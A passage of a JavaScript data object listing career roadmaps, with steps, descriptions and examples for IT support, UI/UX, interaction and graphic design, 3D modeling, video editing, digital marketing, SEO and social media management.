                            { id: "it-3", title: "Windows Troubleshooting", description: "Event Viewer, Task Manager, Device Manager, Safe Mode.", example: "eventvwr.msc; check System log for critical errors." },
                            { id: "it-4", title: "Linux Troubleshooting", description: "journalctl, dmesg, top, netstat.", example: "journalctl -xe; dmesg | tail -20; ss -tulpn" },
                            { id: "it-5", title: "Network Troubleshooting", description: "ping, traceroute, nslookup, ipconfig/ifconfig.", example: "ping 8.8.8.8 → OK? Then traceroute google.com → find hop failure." },
                            { id: "it-6", title: "Blue Screen of Death (BSOD)", description: "Analyzing crash dumps with WinDbg.", example: "!analyze -v in WinDbg; look for driver or memory errors." },
                            { id: "it-7", title: "Software Installation & Conflicts", description: "Clean installs, dependency conflicts, registry.", example: "Revo Uninstaller for thorough removal; SFC /scannow for system file check." },
                            { id: "it-8", title: "Malware Removal", description: "Safe mode scans, Malwarebytes, Windows Defender offline.", example: "Boot to safe mode → Malwarebytes scan → Remove detected threats." },
                            { id: "it-9", title: "Printer & Peripheral Troubleshooting", description: "Drivers, spooler, USB, Bluetooth.", example: "net stop spooler; del /Q /F /S %systemroot%\\system32\\spool\\PRINTERS\\" },
                            { id: "it-10", title: "Active Directory & User Management", description: "Password resets, account lockouts, group membership.", example: "Get-ADUser john | Unlock-ADAccount; Set-ADAccountPassword" },
                            { id: "it-11", title: "Microsoft 365 Administration", description: "Exchange, Teams, SharePoint user management.", example: "Microsoft 365 Admin Center; PowerShell: Set-MsolUserPassword" },
                            { id: "it-12", title: "VPN & Remote Access", description: "Configuring and troubleshooting remote worker connections.", example: "Check VPN client logs; verify split tunneling; check credentials." },
                            { id: "it-13", title: "Ticketing Systems (ServiceNow/Jira)", description: "Logging, prioritizing, and resolving support tickets.", example: "P1: system down → 1hr SLA; P2: significant impact → 4hr SLA." },
                            { id: "it-14", title: "Remote Desktop & Support Tools", description: "RDP, TeamViewer, AnyDesk, Dameware.", example: "mstsc /v:192.168.1.100; TeamViewer for external support." },
                            { id: "it-15", title: "Backup & Data Recovery", description: "Verifying backups, recovering deleted files.", example: "Veeam, Backup Exec, Recuva for file recovery." },
                            { id: "it-16", title: "Patch Management (WSUS/Intune)", description: "Keeping endpoints updated securely.", example: "WSUS: approve updates → clients auto-install; Intune policy deployment." },
                            { id: "it-17", title: "Mobile Device Management (MDM)", description: "Intune, Jamf for managing phones and tablets.", example: "Enroll device → push config profile → enforce screen lock policy." },
                            { id: "it-18", title: "Documentation & Knowledge Base", description: "Writing clear how-to articles and runbooks.", example: "Confluence article: 'How to reset Microsoft 365 MFA' with screenshots." },
                            { id: "it-19", title: "Customer Service & Communication", description: "Clear, empathetic communication with non-technical users.", example: "Avoid jargon; acknowledge the frustration; explain steps simply." },
                            { id: "it-20", title: "Certifications Path", description: "CompTIA A+ → Network+ → Security+ → Microsoft/Google certs.", example: "A+ is the entry-level gold standard for IT support." }
                        ]
                    }
                ],
                project: "Set up a full helpdesk: ticketing system, knowledge base, remote support tool, and patch management for 50 test endpoints."
            }
        ]
    },
    uidesign: {
        title: "UI/UX Design Roadmap",
        stages: [
            {
                title: "Design Fundamentals & Tools",
                modules: [
                    {
                        id: "ui-1", title: "Visual Design & Figma",
                        steps: [
                            { id: "ui-1", title: "Design Principles", description: "Contrast, alignment, repetition, proximity (CARP).", example: "High contrast for accessibility; alignment for clean layouts." },
                            { id: "ui-2", title: "Color Theory", description: "Hue, saturation, value, color harmony, brand colors.", example: "Complementary: blue + orange; triadic: red, yellow, blue." },
                            { id: "ui-3", title: "Typography", description: "Typefaces, hierarchy, line height, readability.", example: "H1: 48px bold; body: 16px regular; line-height: 1.5." },
                            { id: "ui-4", title: "Spacing & Layout", description: "Grid systems, 8px grid, padding, margins.", example: "12-column grid; 8px spacing unit; 24px margin between sections." },
                            { id: "ui-5", title: "Figma Basics", description: "Frames, layers, components, styles.", example: "Create a button component with variants (primary, secondary, disabled)." },
                            { id: "ui-6", title: "Design Systems", description: "Tokens, component libraries, documentation.", example: "Color tokens: --color-primary: #2563EB; consistent across all components." },
                            { id: "ui-7", title: "Accessibility (WCAG 2.1)", description: "Color contrast, alt text, keyboard navigation, ARIA.", example: "4.5:1 contrast ratio for normal text; use role='button' for custom buttons." },
                            { id: "ui-8", title: "User Research", description: "Interviews, surveys, contextual inquiry, analytics.", example: "5 user interviews reveal 3 major pain points in checkout flow." },
                            { id: "ui-9", title: "User Personas", description: "Creating representative user archetypes.", example: "Persona: 'Busy Sarah' — 34, working mom, shops on mobile during commute." },
                            { id: "ui-10", title: "User Journey Mapping", description: "Visualizing the end-to-end user experience.", example: "Touchpoints: Awareness → Consideration → Decision → Retention → Advocacy." },
                            { id: "ui-11", title: "Information Architecture", description: "Sitemap, navigation, content organization.", example: "Card sorting with 10 users to determine navigation structure." },
                            { id: "ui-12", title: "Wireframing", description: "Low-fidelity sketches of layouts.", example: "Paper sketches → Figma Lo-Fi → Hi-Fi mockup." },
                            { id: "ui-13", title: "Prototyping in Figma", description: "Interactive click-through prototypes.", example: "Connect frames with interactions: click → navigate → overlay." },
                            { id: "ui-14", title: "Usability Testing", description: "Observing users completing tasks.", example: "5 users on task 'Find and add item to cart'; record and note hesitations." },
                            { id: "ui-15", title: "A/B Testing for UX", description: "Data-driven design decisions.", example: "Version A: CTA says 'Get Started'; B: 'Try for Free' — B wins by 15%." },
                            { id: "ui-16", title: "Mobile-First Design", description: "Designing for small screens first.", example: "320px → 768px → 1024px → 1440px breakpoints." },
                            { id: "ui-17", title: "Motion & Micro-interactions", description: "Animations that provide feedback and delight.", example: "Button click → subtle scale animation; form success → checkmark appears." },
                            { id: "ui-18", title: "Responsive Design Principles", description: "Fluid grids, flexible images, media queries.", example: "@media (max-width: 768px) { .sidebar { display: none; } }" },
                            { id: "ui-19", title: "Handoff to Developers", description: "Annotating designs, using Figma inspect, writing specs.", example: "Figma → Developer Mode; export assets; annotate spacing and states." },
                            { id: "ui-20", title: "Portfolio Building", description: "Documenting case studies for job applications.", example: "Problem → Research → Iteration → Solution → Results format." }
                        ]
                    }
                ],
                project: "Complete end-to-end UX case study: research, persona, journey map, wireframes, prototype, usability test, and design system."
            }
        ]
    },
    interactiondesign: {
        title: "Interaction Design Roadmap",
        stages: [
            {
                title: "IxD Principles & Prototyping",
                modules: [
                    {
                        id: "ix-1", title: "Interaction Design Fundamentals",
                        steps: [
                            { id: "ix-1", title: "The 5 Dimensions of IxD", description: "Words, visuals, space, time, behavior.", example: "Transition animation = time dimension; layout = space dimension." },
                            { id: "ix-2", title: "Mental Models", description: "Designing to match user expectations.", example: "Trash icon = deletion; shopping cart icon = purchase intent." },
                            { id: "ix-3", title: "Affordances & Signifiers", description: "Conveying how an element should be used.", example: "Button shadow = affordance to press; underlined text = hyperlink." },
                            { id: "ix-4", title: "Feedback & Response", description: "Immediate system response to user actions.", example: "Loading spinner, success message, error state." },
                            { id: "ix-5", title: "Fitts's Law", description: "Target size and distance affects interaction time.", example: "Make buttons larger for primary actions; put CTA close to form." },
                            { id: "ix-6", title: "Hick's Law", description: "More choices = more decision time.", example: "Limit navigation items to 7±2; progressive disclosure." },
                            { id: "ix-7", title: "Gesture Design (Mobile)", description: "Swipe, pinch, long-press patterns.", example: "Swipe right = go back (iOS); swipe left = delete item." },
                            { id: "ix-8", title: "Animation Principles", description: "Easing, timing, purpose of motion.", example: "Ease-in-out for transitions; spring animation for natural feel." },
                            { id: "ix-9", title: "Error Prevention & Recovery", description: "Designing to prevent and gracefully handle errors.", example: "Confirm before delete; inline validation; undo capability." },
                            { id: "ix-10", title: "Form Design", description: "Labels, field types, validation, multi-step forms.", example: "Float labels; real-time validation; progress indicator on multi-step." },
                            { id: "ix-11", title: "Navigation Patterns", description: "Tab bars, hamburger menus, breadcrumbs, sidebars.", example: "Bottom tab bar for 3-5 primary navigation on mobile." },
                            { id: "ix-12", title: "Onboarding Flows", description: "Progressive onboarding, empty states, tooltips.", example: "3-screen onboarding with value props; skip option always visible." },
                            { id: "ix-13", title: "Touch Target Guidelines", description: "Minimum 44x44px tap targets (Apple HIG).", example: "Ensure 8px spacing between touch targets." },
                            { id: "ix-14", title: "Dark Patterns (What NOT to do)", description: "Anti-patterns that manipulate users.", example: "Roach motel, confirmshaming, misdirection — avoid always." },
                            { id: "ix-15", title: "Prototyping Tools (Figma/Framer)", description: "Building realistic interactive prototypes.", example: "Framer: code-based interactions; Figma: click-through prototypes." },
                            { id: "ix-16", title: "Multi-State Components", description: "Default, hover, active, disabled, loading states.", example: "Button: enabled → hover (shadow) → active (pressed) → loading → disabled." },
                            { id: "ix-17", title: "Voice UI Design", description: "Designing for Alexa, Siri, Google Assistant.", example: "Conversation flows; slot filling; error handling in voice." },
                            { id: "ix-18", title: "AR/VR Interaction Design", description: "Spatial UI, gaze interaction, haptics.", example: "Dwell selection in eye-tracking; controller pointer interactions in VR." },
                            { id: "ix-19", title: "Accessibility in Interactions", description: "Keyboard nav, focus management, screen reader compat.", example: "Tab order must follow logical reading order; :focus-visible styles." },
                            { id: "ix-20", title: "IxD Portfolio & Case Studies", description: "Documenting process and outcomes.", example: "Problem → hypothesis → design iterations → results (metrics)." }
                        ]
                    }
                ],
                project: "Design a complete checkout flow with micro-interactions, error states, loading states, and mobile responsiveness in Figma."
            }
        ]
    },
    graphicdesign: {
        title: "Graphic Design Roadmap",
        stages: [
            {
                title: "Visual Communication & Branding",
                modules: [
                    {
                        id: "gr-1", title: "Graphic Design Fundamentals",
                        steps: [
                            { id: "gr-1", title: "Design Elements", description: "Line, shape, form, texture, space, color, value.", example: "Horizontal lines = calm; diagonal = dynamic; thick = bold." },
                            { id: "gr-2", title: "Design Principles", description: "Balance, hierarchy, emphasis, rhythm, unity, variety.", example: "Visual hierarchy: large heading → subheading → body → caption." },
                            { id: "gr-3", title: "Color Theory & Palettes", description: "Analogous, complementary, triadic schemes.", example: "Tools: Coolors.co, Adobe Color. Export as HEX/RGB." },
                            { id: "gr-4", title: "Typography Mastery", description: "Serif vs sans-serif, kerning, tracking, leading.", example: "Logo: custom lettering; headers: Playfair Display; body: Inter." },
                            { id: "gr-5", title: "Adobe Illustrator", description: "Vector graphics, pentools, pathfinder.", example: "Pen tool to create logo icon; Pathfinder to combine shapes." },
                            { id: "gr-6", title: "Adobe Photoshop", description: "Photo retouching, compositing, masks.", example: "Select subject → remove background → composite on new background." },
                            { id: "gr-7", title: "Logo Design", description: "Wordmark, lettermark, symbol, combination marks.", example: "Sketch 20 concepts → refine 3 → vectorize winner in Illustrator." },
                            { id: "gr-8", title: "Brand Identity Systems", description: "Logo, color palette, typography, imagery guidelines.", example: "Brand kit: primary logo, secondary, mono versions + usage dos/don'ts." },
                            { id: "gr-9", title: "Print Design", description: "Bleed, trim, CMYK, resolution, file formats.", example: "3mm bleed; 300 DPI; export as press-ready PDF (PDF/X-1a)." },
                            { id: "gr-10", title: "Digital Design", description: "Screen color (RGB/hex), web resolutions, export formats.", example: "Social post: 1080x1080px; export as sRGB PNG/JPEG." },
                            { id: "gr-11", title: "Layout & Composition", description: "Rule of thirds, golden ratio, grid systems.", example: "Magazine spread using 12-column grid with 6px gutter." },
                            { id: "gr-12", title: "Infographic Design", description: "Visualizing data clearly and attractively.", example: "Bar chart → custom illustrated infographic in Illustrator." },
                            { id: "gr-13", title: "Packaging Design", description: "Dielines, structural design, shelf impact.", example: "Download dieline → place artwork → mock up in Photoshop." },
                            { id: "gr-14", title: "Motion Graphics (Adobe After Effects)", description: "Animating logos, titles, and infographics.", example: "Logo reveal: scale from 0 → 100% with ease; export GIF/MP4." },
                            { id: "gr-15", title: "Presentation Design (PowerPoint/Keynote)", description: "Visually compelling slide decks.", example: "One idea per slide; large visuals; minimal text." },
                            { id: "gr-16", title: "Social Media Design", description: "Platform-specific formats, brand consistency.", example: "Instagram: 1080x1080px; Story: 1080x1920px; LinkedIn: 1200x628px." },
                            { id: "gr-17", title: "Illustration", description: "Flat design, isometric, line art styles.", example: "Adobe Illustrator or Procreate for digital illustration." },
                            { id: "gr-18", title: "Design Brief Process", description: "Understanding client requirements, mood boards.", example: "Brief → moodboard → 3 concepts → revisions → final delivery." },
                            { id: "gr-19", title: "File Management & Deliverables", description: "Organized layers, naming conventions, final export.", example: "AI/PSD source files + exported PNG/SVG/PDF + style guide." },
                            { id: "gr-20", title: "Portfolio & Freelancing", description: "Behance, Dribbble, pricing, client contracts.", example: "10 portfolio pieces; case study format for each project." }
                        ]
                    }
                ],
                project: "Complete brand identity project: design a logo, color palette, typography system, and 3-piece collateral (business card, letterhead, social media kit)."
            }
        ]
    },
    "3dmodeling": {
        title: "3D Modeling Roadmap",
        stages: [
            {
                title: "Modeling, Texturing & Rendering",
                modules: [
                    {
                        id: "3d-1", title: "3D Modeling with Blender",
                        steps: [
                            { id: "3d-1", title: "Blender Interface", description: "Viewport, outliner, properties, timeline.", example: "N panel for properties; G/R/S for grab/rotate/scale; X to delete." },
                            { id: "3d-2", title: "Mesh Modeling Basics", description: "Vertices, edges, faces, edit mode.", example: "Tab to enter edit mode; E to extrude; Ctrl+R to loop cut." },
                            { id: "3d-3", title: "Boolean Modeling", description: "Subtracting and joining shapes.", example: "Object A - Boolean modifier - difference - Object B → hole punched through A." },
                            { id: "3d-4", title: "Subdivision Surface Modeling", description: "High-poly smooth surfaces from low-poly base.", example: "Add Subdivision Surface modifier; Crease edges (Shift+E) for sharpness." },
                            { id: "3d-5", title: "Sculpting", description: "Organic shapes using brushes.", example: "Switch to Sculpt Mode; use Clay Strips, Smooth, Grab brushes." },
                            { id: "3d-6", title: "UV Unwrapping", description: "Mapping 3D surfaces to 2D for texturing.", example: "Mark seams (Ctrl+E); unwrap (U → Unwrap); check UV editor." },
                            { id: "3d-7", title: "Materials & Shaders (Principled BSDF)", description: "Creating realistic surface materials.", example: "Principled BSDF: set Roughness, Metallic, Base Color, IOR." },
                            { id: "3d-8", title: "Texture Painting", description: "Painting directly onto the 3D mesh.", example: "Texture Paint mode; paint color map; bake to texture." },
                            { id: "3d-9", title: "PBR Textures (Substance/Quixel)", description: "Physically-based rendering texture sets.", example: "Download albedo, roughness, normal, AO maps; plug into shader nodes." },
                            { id: "3d-10", title: "Rigging & Armatures", description: "Creating skeletons for characters.", example: "Add armature; parent mesh to armature; weight paint for influence." },
                            { id: "3d-11", title: "Animation Basics", description: "Keyframes, curves, the dopesheet.", example: "Press I to insert keyframe; use Graph Editor for easing." },
                            { id: "3d-12", title: "Lighting Techniques", description: "Three-point lighting, HDRI environments.", example: "Key light (main), Fill light (shadows), Back light (rim)." },
                            { id: "3d-13", title: "Cycles Rendering", description: "Path-traced photorealistic rendering.", example: "Set render engine to Cycles; samples 512+; enable denoising." },
                            { id: "3d-14", title: "EEVEE Real-Time Rendering", description: "Fast render engine for animation.", example: "Screen Space Reflections, Ambient Occlusion, Bloom in EEVEE." },
                            { id: "3d-15", title: "Camera Setup & Composition", description: "Field of view, depth of field, rule of thirds.", example: "Focal length 50mm; F-stop 1.8 for bokeh; lock camera to view." },
                            { id: "3d-16", title: "Geometry Nodes", description: "Procedural modeling and effects.", example: "Scatter rocks on terrain; grow vines procedurally." },
                            { id: "3d-17", title: "Particle Systems", description: "Hair, fur, grass, debris.", example: "Add particle system → hair type → comb with particle edit mode." },
                            { id: "3d-18", title: "Exporting for Game Engines", description: "FBX/GLTF export with correct scale.", example: "Export as GLTF 2.0 → import to Unity/Unreal; check Apply Transform." },
                            { id: "3d-19", title: "Maya/Cinema 4D Overview", description: "Industry tools beyond Blender.", example: "Maya for film VFX; C4D for motion graphics." },
                            { id: "3d-20", title: "Portfolio & Artstation", description: "Showcasing 3D work professionally.", example: "Post renders to Artstation; make a turntable animation; write process breakdown." }
                        ]
                    }
                ],
                project: "Model, texture, rig, and animate a character or vehicle; render a cinematic scene with proper lighting."
            }
        ]
    },
    videoediting: {
        title: "Video Editing Roadmap",
        stages: [
            {
                title: "Editing, Color & Audio",
                modules: [
                    {
                        id: "vid-1", title: "Video Editing & Post-Production",
                        steps: [
                            { id: "vid-1", title: "Video Editing Workflow", description: "Ingest → Organize → Edit → Color → Audio → Export.", example: "Create bins/folders; tag footage; rough cut → fine cut → locked cut." },
                            { id: "vid-2", title: "Adobe Premiere Pro Basics", description: "Timeline, sequence settings, tools.", example: "Import footage → drag to timeline → trim with Ripple Edit (B) or Razor (C)." },
                            { id: "vid-3", title: "DaVinci Resolve Basics", description: "Free professional-grade NLE.", example: "Cut page: quick editing; Edit page: fine assembly; Color page: grading." },
                            { id: "vid-4", title: "Cuts & Transitions", description: "Hard cuts, J/L cuts, cross-dissolves, match cuts.", example: "J-cut: audio starts before video cut; L-cut: audio continues after cut." },
                            { id: "vid-5", title: "Color Correction", description: "Balancing exposure, white balance, skin tones.", example: "Lift, Gamma, Gain (shadows, mids, highlights); check vectorscope/waveform." },
                            { id: "vid-6", title: "Color Grading", description: "Creating a cinematic look.", example: "Teal & orange LUT; Log footage → apply LUT → fine-tune." },
                            { id: "vid-7", title: "Audio Editing", description: "Levels, noise reduction, music mixing.", example: "Normalize dialogue to -12 dBFS; reduce background noise with RX; mix music at -20 dBFS." },
                            { id: "vid-8", title: "Audio Mixing & SFX", description: "Layering sound effects, ambience, foley.", example: "Footstep foley; ambient room tone; sync SFX to action." },
                            { id: "vid-9", title: "Motion Graphics (After Effects)", description: "Lower thirds, titles, animated infographics.", example: "Essential Graphics in Premiere; After Effects dynamic link for complex animations." },
                            { id: "vid-10", title: "Text & Subtitles", description: "Captions for accessibility and platforms.", example: "Premiere > Captions panel; auto-generate with speech-to-text AI." },
                            { id: "vid-11", title: "Green Screen (Chroma Key)", description: "Removing green backgrounds.", example: "Ultra Key effect in Premiere; refine matte; add replacement background." },
                            { id: "vid-12", title: "Visual Effects (VFX Basics)", description: "Tracking, compositing, rotoscoping.", example: "Mocha Pro for planar tracking; replace billboard with tracked footage." },
                            { id: "vid-13", title: "Multi-Camera Editing", description: "Syncing and switching between cameras.", example: "Premiere: sync by audio → Multi-Camera Sequence → switch in Sequence Monitor." },
                            { id: "vid-14", title: "Pacing & Rhythm", description: "Cutting to music beats, tension, flow.", example: "Mark beats in Premiere (M); cut on downbeat for energetic feel." },
                            { id: "vid-15", title: "Export Settings", description: "H.264, ProRes, HEVC; bitrates for web/broadcast.", example: "YouTube: H.264, 8Mbps 1080p60; Netflix: ProRes 4444 4K." },
                            { id: "vid-16", title: "Short-Form Content (Reels/TikTok)", description: "Vertical 9:16 editing for social platforms.", example: "9:16 sequence; 15-60 sec edits; quick cuts; text overlays." },
                            { id: "vid-17", title: "Long-Form Documentary Editing", description: "Interview editing, b-roll, narration.", example: "String out interviews; intercut with b-roll; add narration track." },
                            { id: "vid-18", title: "Collaboration & Cloud Workflows", description: "Frame.io for review, proxies for remote edit.", example: "Upload cut to Frame.io → client adds comments → address and export." },
                            { id: "vid-19", title: "Premiere/Resolve Plugins", description: "Enhancing workflow with plugins.", example: "Film Impact transitions; BorisFX; Neat Video for noise reduction." },
                            { id: "vid-20", title: "Portfolio Reel", description: "Creating a 1-2 minute showreel.", example: "Best 15-30 second clips per project; match cut to music; upload to Vimeo." }
                        ]
                    }
                ],
                project: "Produce a 3-5 minute mini-documentary or promotional video with color grade, mixed audio track, and motion graphics title."
            }
        ]
    },
    digitalmarketing: {
        title: "Digital Marketing Roadmap",
        stages: [
            {
                title: "Core Marketing Channels & Strategy",
                modules: [
                    {
                        id: "dm-1", title: "Digital Marketing Fundamentals",
                        steps: [
                            { id: "dm-1", title: "Digital Marketing Overview", description: "SEO, SEM, SMM, Email, Content, Affiliate channels.", example: "Owned media (website), paid media (ads), earned media (PR, reviews)." },
                            { id: "dm-2", title: "Marketing Funnels", description: "TOFU (Awareness) → MOFU (Consideration) → BOFU (Decision).", example: "Blog post → Lead magnet → Email sequence → Demo call → Purchase." },
                            { id: "dm-3", title: "Target Audience & Buyer Personas", description: "Defining who you're marketing to.", example: "Persona: 'Growth-stage startup CEO', using LinkedIn, wants ROI fast, pain: CAC too high." },
                            { id: "dm-4", title: "Google Analytics 4", description: "Tracking website traffic, events, conversions.", example: "GA4: users, sessions, events, conversion rate; funnels; Looker Studio dashboards." },
                            { id: "dm-5", title: "Search Engine Marketing (Google Ads)", description: "PPC campaigns, Quality Score, bidding.", example: "Campaign → Ad Group (keyword clusters) → Ads → Landing Pages → Conversions." },
                            { id: "dm-6", title: "Facebook & Instagram Ads", description: "Audience targeting, campaign structure, creative.", example: "Campaign: awareness; Ad set: lookalike audience; Ad: carousel video." },
                            { id: "dm-7", title: "LinkedIn Ads", description: "B2B targeting by job title, company size, industry.", example: "Sponsored content; InMail ads; text ads for specific decision-makers." },
                            { id: "dm-8", title: "Content Marketing", description: "Creating value-first content to attract and convert.", example: "Blog → YouTube → Podcast → Email newsletter → gated ebook." },
                            { id: "dm-9", title: "SEO Fundamentals", description: "On-page, off-page, technical SEO.", example: "Keyword research → optimize title/meta/H1 → build backlinks → monitor rankings." },
                            { id: "dm-10", title: "Email Marketing", description: "List building, automation, segmentation.", example: "Welcome sequence; abandoned cart email; re-engagement campaign." },
                            { id: "dm-11", title: "CRO (Conversion Rate Optimization)", description: "Improving the % of visitors who convert.", example: "A/B test CTA button color; heatmaps with Hotjar; form optimization." },
                            { id: "dm-12", title: "Influencer Marketing", description: "Partnering with creators for reach.", example: "Micro-influencers (10k-100k followers) often have higher engagement rates." },
                            { id: "dm-13", title: "Affiliate Marketing", description: "Performance-based partnerships.", example: "ShareASale, Impact; pay 20% commission per sale generated by affiliate." },
                            { id: "dm-14", title: "Marketing Automation (HubSpot/Marketo)", description: "Automating lead nurturing workflows.", example: "New lead → CRM → automated email sequence → sales hand-off at lead score 80." },
                            { id: "dm-15", title: "UTM Tracking", description: "Tracking campaign traffic accurately.", example: "?utm_source=newsletter&utm_medium=email&utm_campaign=black-friday-2024" },
                            { id: "dm-16", title: "Marketing Metrics & KPIs", description: "CAC, CLV, ROAS, CTR, CPC, MQL, SQL.", example: "ROAS = revenue / ad spend; target ROAS > 4x for profitable campaigns." },
                            { id: "dm-17", title: "Video Marketing", description: "YouTube SEO, video ads, short-form content.", example: "YouTube: keyword in title/description/tags; Shorts for discovery; pre-roll ads." },
                            { id: "dm-18", title: "Growth Hacking", description: "Rapid experimentation to find scalable growth.", example: "AirBnb Craigslist hack; Dropbox referral program; viral loops." },
                            { id: "dm-19", title: "Brand Building", description: "Creating a consistent, memorable brand identity.", example: "Logo, colors, tone of voice, positioning statement, tagline." },
                            { id: "dm-20", title: "Marketing Strategy & Budget Planning", description: "Allocating spend across channels.", example: "40% SEO/content; 30% paid ads; 20% email; 10% experiments." }
                        ]
                    }
                ],
                project: "Launch a full digital marketing campaign: build a landing page, run A/B tests, set up Google Ads, email automation, and track ROI in GA4."
            }
        ]
    },
    seospecialist: {
        title: "SEO Specialist Roadmap",
        stages: [
            {
                title: "Search Engine Optimization",
                modules: [
                    {
                        id: "seo-1", title: "On-Page, Technical & Off-Page SEO",
                        steps: [
                            { id: "seo-1", title: "How Search Engines Work", description: "Crawling, indexing, ranking, algorithm updates.", example: "Googlebot crawls → indexes → PageRank algorithm ranks → SERP." },
                            { id: "seo-2", title: "Keyword Research", description: "Finding search terms with the right volume and intent.", example: "Ahrefs/SEMrush: filter by monthly volume >500, KD<30, informational intent." },
                            { id: "seo-3", title: "Search Intent", description: "Informational, navigational, transactional, commercial.", example: "'How to tie a tie' = informational; 'buy running shoes' = transactional." },
                            { id: "seo-4", title: "On-Page SEO", description: "Title tags, meta descriptions, H1s, URL structure.", example: "<title>Best Running Shoes 2024 | ExampleStore</title> — 50-60 chars." },
                            { id: "seo-5", title: "Content Optimization", description: "Matching content depth and format to search intent.", example: "Top-ranking page has 2000 words → write comprehensive, high-quality 2500 words." },
                            { id: "seo-6", title: "Topic Clusters & Pillar Pages", description: "Content architecture for authority.", example: "Pillar: 'SEO Guide'; Clusters: 'keyword research', 'technical SEO', 'link building'." },
                            { id: "seo-7", title: "Technical SEO", description: "Site speed, crawlability, indexing, structured data.", example: "Core Web Vitals: LCP < 2.5s, FID < 100ms, CLS < 0.1." },
                            { id: "seo-8", title: "XML Sitemaps & Robots.txt", description: "Controlling crawl access.", example: "Submit sitemap.xml in Google Search Console; robots.txt: Disallow: /admin/" },
                            { id: "seo-9", title: "Canonical Tags", description: "Preventing duplicate content issues.", example: "<link rel='canonical' href='https://example.com/post/'>" },
                            { id: "seo-10", title: "Schema Markup (Structured Data)", description: "Rich snippets: reviews, FAQs, recipes.", example: "FAQPage schema → FAQ rich result in SERP." },
                            { id: "seo-11", title: "Core Web Vitals", description: "Google's page experience signals.", example: "Use PageSpeed Insights; fix LCP (large images), CLS (layout shifts), FID (JS blocking)." },
                            { id: "seo-12", title: "Link Building", description: "Earning high-quality backlinks.", example: "Guest posting; broken link building; digital PR; HARO responses." },
                            { id: "seo-13", title: "Internal Linking", description: "Distributing link equity and improving crawlability.", example: "Deep link from high-traffic pages to important but lower-traffic pages." },
                            { id: "seo-14", title: "Local SEO", description: "Optimizing for local search (Google Business Profile).", example: "Complete GBP; add photos; get reviews; NAP consistency." },
                            { id: "seo-15", title: "E-commerce SEO", description: "Category pages, product pages, faceted navigation.", example: "Canonical for filtered URLs; unique product descriptions; structured data." },
                            { id: "seo-16", title: "International SEO", description: "hreflang tags, multilingual/multi-regional content.", example: "<link rel='alternate' hreflang='es' href='https://example.com/es/'>" },
                            { id: "seo-17", title: "Google Search Console", description: "Traffic data, indexing status, coverage, enhancements.", example: "Monitor clicks, impressions, average position; fix crawl errors." },
                            { id: "seo-18", title: "Ahrefs / SEMrush", description: "Backlink analysis, competitor research, rank tracking.", example: "Ahrefs Site Explorer → competitor's top pages → replicate content strategy." },
                            { id: "seo-19", title: "Algorithm Updates & Recovery", description: "Responding to Google core updates.", example: "Panda (content quality), Penguin (links), Helpful Content Update — focus on E-E-A-T." },
                            { id: "seo-20", title: "SEO Reporting", description: "Monthly reporting on rankings, traffic, conversions.", example: "Looker Studio dashboard: organic sessions, top keywords, conversions YoY." }
                        ]
                    }
                ],
                project: "Conduct a full SEO audit, implement fixes, build 5 pieces of optimized content, and demonstrate ranking improvements in 90 days."
            }
        ]
    },
    socialmediamanager: {
        title: "Social Media Manager Roadmap",
        stages: [
            {
                title: "Strategy, Content & Analytics",
                modules: [
                    {
                        id: "smm-1", title: "Social Media Management",
                        steps: [
                            { id: "smm-1", title: "Social Media Strategy", description: "Setting goals, identifying platforms, defining audience.", example: "B2C brand → Instagram + TikTok; B2B → LinkedIn; young audience → Snapchat." },
                            { id: "smm-2", title: "Platform-Specific Best Practices", description: "Algorithm, content formats, posting frequency.", example: "Instagram: Reels 3x/week; LinkedIn: thought leadership 1x/day; TikTok: 1-3x/day." },
                            { id: "smm-3", title: "Content Calendar", description: "Planning posts in advance with themes and variety.", example: "Mon: Tips; Wed: User story; Fri: Behind scenes; Sun: Engagement question." },
                            { id: "smm-4", title: "Content Creation (Photo & Video)", description: "Creating visuals with Canva, Adobe Express.", example: "Template library; brand kit; export 1:1 for feed; 9:16 for Stories/Reels." },
                            { id: "smm-5", title: "Copywriting for Social", description: "Hooks, CTAs, hashtags, captions.", example: "Hook: 'This one trick increased our sales by 300%.' Body: context. CTA: 'Save this for later.'" },
                            { id: "smm-6", title: "Hashtag Strategy", description: "Mixing niche, mid, and broad hashtags.", example: "5 tight-niche (1k-10k) + 5 mid (10k-100k) + 2 broad (100k+) = discoverability." },
                            { id: "smm-7", title: "Scheduling Tools", description: "Buffer, Hootsuite, Later for batch scheduling.", example: "Buffer: schedule 2 weeks of content in one session; auto-publish optimal times." },
                            { id: "smm-8", title: "Community Management", description: "Replying to comments and DMs, moderating.", example: "Respond within 1hr; use saved replies for FAQs; escalate complaints to support." },
                            { id: "smm-9", title: "Social Media Analytics", description: "Reach, impressions, engagement rate, follower growth.", example: "Engagement rate = (likes+comments+shares)/reach × 100; target >3%." },
                            { id: "smm-10", title: "Influencer Collaboration", description: "Identifying, briefing, and tracking influencer posts.", example: "Use Upfluence or Aspire; give creative brief; track via UTM links or promo codes." },
                            { id: "smm-11", title: "User-Generated Content (UGC)", description: "Encouraging and repurposing customer content.", example: "Ask customers to tag brand → repost with credit → testimonial-style UGC." },
                            { id: "smm-12", title: "Social Listening", description: "Monitoring brand mentions and trends.", example: "Brandwatch, Mention, Sprout Social; monitor brand + competitors + keywords." },
                            { id: "smm-13", title: "Paid Social Campaigns", description: "Boosted posts, paid reach, ad campaigns.", example: "Boost high-organic-performance post; run traffic campaign to lead magnet." },
                            { id: "smm-14", title: "Instagram Reels & TikTok Strategy", description: "Short-form video for viral growth.", example: "Hook in first 1-2s; trending sound; relatable niche content; clear CTA." },
                            { id: "smm-15", title: "LinkedIn Content Strategy", description: "B2B thought leadership on LinkedIn.", example: "Personal narrative posts; data-backed insights; carousels for reach; polls for engagement." },
                            { id: "smm-16", title: "YouTube Channel Management", description: "Thumbnails, titles, descriptions, chapters.", example: "Click-worthy thumbnail (face + text); keyword in title; description with timestamps." },
                            { id: "smm-17", title: "Crisis Management", description: "Responding to PR crises on social media.", example: "Monitor, acknowledge quickly, apologize sincerely, share action plan, follow up." },
                            { id: "smm-18", title: "A/B Testing Content", description: "Testing formats, captions, posting times.", example: "Post same content as Reel AND carousel; compare reach and saves after 48hrs." },
                            { id: "smm-19", title: "Social Commerce", description: "Shopping features on Instagram and TikTok.", example: "Instagram Shop: tag products in posts; TikTok Shop: in-video product links." },
                            { id: "smm-20", title: "Monthly Reporting", description: "Reporting metrics to stakeholders.", example: "Looker Studio or Sprout Social report: followers, engagement, reach, top posts." }
                        ]
                    }
                ],
                project: "Manage a brand's social media for 30 days: content calendar, scheduled posts, community management, analytics report."
            }
        ]
    },
    contentcreator: {
        title: "Content Creator Roadmap",
        stages: [
            {
